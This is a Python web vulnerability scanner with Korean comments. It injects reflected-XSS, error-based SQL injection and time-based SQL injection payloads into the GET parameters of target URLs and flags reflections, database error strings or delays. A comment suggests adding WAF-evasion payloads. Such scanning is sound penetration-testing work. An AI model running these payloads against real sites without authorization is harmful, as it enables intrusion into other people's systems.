import requests
import time
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console

console = Console()

class CustomScanner:
    def __init__(self, target_urls):
        self.target_urls = target_urls
        self.vulnerabilities = []
        
        # 기본 점검용 페이로드 (실제 환경에선 WAF 우회용 난독화 페이로드 추가)
        self.payloads = {
            "XSS": [
                '"><script>alert(1)</script>',
                '<img src=x onerror=alert(document.domain)>',
                'javascript:alert(1)//'
            ],
            "SQLi_Error": [
                "' OR '1'='1",
                "' OR 1=1--",
                "\" OR \"1\"=\"1"
            ],
            "SQLi_Time": [ # MySQL/PostgreSQL/MSSQL 타겟팅
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "'||pg_sleep(5)--"
            ]
        }

    def scan_url(self, url):
        """URL의 파라미터에 페이로드를 주입하여 취약점 검사"""
        if "?" not in url:
            return # GET 파라미터가 없으면 일단 패스 (POST 폼은 별도 로직 필요)

        base_url, query_string = url.split("?", 1)
        params = query_string.split("&")

        for i, param in enumerate(params):
            if "=" not in param: continue
            p_name, p_value = param.split("=", 1)

            # 1. XSS 검사 (Reflected)
            for payload in self.payloads["XSS"]:
                test_params = params.copy()
                test_params[i] = f"{p_name}={payload}"
                test_url = f"{base_url}?{'&'.join(test_params)}"
                try:
                    res = requests.get(test_url, timeout=5, verify=False)
                    if payload in res.text:
                        self.vulnerabilities.append({"type": "Reflected XSS", "url": test_url, "payload": payload})
                        break # 하나 찾으면 다음 취약점 검사로 넘어감
                except: pass

            # 2. SQLi 검사 (Error Based - 에러 메시지 노출 확인)
            for payload in self.payloads["SQLi_Error"]:
                test_params = params.copy()
                test_params[i] = f"{p_name}={p_value}{payload}"
                test_url = f"{base_url}?{'&'.join(test_params)}"
                try:
                    res = requests.get(test_url, timeout=5, verify=False)
                    errors = ["SQL syntax", "mysql_fetch_array", "ORA-", "PostgreSQL query failed"]
                    if any(err.lower() in res.text.lower() for err in errors):
                        self.vulnerabilities.append({"type": "Error-Based SQLi", "url": test_url, "payload": payload})
                        break
                except: pass

            # 3. SQLi 검사 (Time Based - 응답 지연 시간 확인)
            for payload in self.payloads["SQLi_Time"]:
                test_params = params.copy()
                test_params[i] = f"{p_name}={p_value}{payload}"
                test_url = f"{base_url}?{'&'.join(test_params)}"
                try:
                    start_time = time.time()
                    requests.get(test_url, timeout=10, verify=False)
                    elapsed_time = time.time() - start_time
                    if elapsed_time >= 4.5: # 5초 슬립을 주입했으므로 4.5초 이상 걸리면 취약
                        self.vulnerabilities.append({"type": "Time-Based SQLi", "url": test_url, "payload": payload})
                        break
                except requests.exceptions.ReadTimeout:
                    # 타임아웃 발생 시 Time-based SQLi 가능성 매우 높음
                    self.vulnerabilities.append({"type": "Time-Based SQLi (Timeout)", "url": test_url, "payload": payload})
                    break
                except: pass

    def run(self, threads=10):
        console.print(f"[bold blue][*][/bold blue] Running Custom XSS & SQLi Scanner on endpoints with parameters...")
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self.scan_url, self.target_urls)
        
        console.print(f"[bold green][+][/bold green] Found {len(self.vulnerabilities)} custom vulnerabilities")
        return self.vulnerabilities

def run_custom_scanner(endpoints):
    # 엔드포인트 중 파라미터가 있는 것만 필터링
    targets = [ep for ep in endpoints if "?" in ep]
    if not targets:
        console.print("[yellow][!][/yellow] No endpoints with parameters found for custom scanning.")
        return []
    scanner = CustomScanner(targets)
    return scanner.run()
